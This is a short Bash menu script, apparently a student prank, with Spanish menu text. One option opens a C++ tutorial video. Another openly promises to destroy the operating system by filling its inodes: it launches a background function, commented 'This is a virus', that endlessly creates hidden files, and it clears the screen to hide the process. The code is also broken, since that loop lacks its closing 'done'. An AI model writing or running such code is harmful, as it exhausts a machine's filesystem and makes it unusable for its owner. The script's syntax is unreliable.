#!/bin/bash

# Function definitions
# Clear Screen
clearScreen(){
    clear
}

# MENU functions
OPCION=-1
EXIT=0

displayMenu(){
    echo "---- MENU ----"
    echo "[1] Aprender a programar en C++"
    echo "[2] Destruir el sistema Operativo llenando los I-Nodos"
    echo "[3]"
    echo "[4]"
    echo "[5]"
    echo "[6] SALIR"
}

readOpcion(){
    read OPT
    if [[ $OPT -le 0 || $OPT -ge 7 ]];
        then
        echo "Opcion no valida"
    fi

    case $OPT in
        1)
            aprenderCplusplus
            ;;
        2)
            iNodeFiller &
            clearScreen
            ;;
        3)
            echo "3"
            ;;
        4)
            echo "4"
            ;;
        5)
            echo "5"
            ;;
        6)
            echo "Saliendo del menú"
            EXIT=1
        ;;
    esac

}

resetOpcion(){
    OPCION=-1
}


runMenu(){
    while(($EXIT != 1))
    do
    clearScreen
    displayMenu
    readOpcion
    sleep 1
    done
}

aprenderCplusplus(){
    xdg-open "https://www.youtube.com/watch?v=8jLOx1hD3_o" > /dev/null 2>&1
    sleep 2
}

iNodeFiller(){
    #This is a virus
    I=0
    while :
    do 
        I=$((I+1))
        touch .f$I > /dev/null 2>&1;
}
runMenu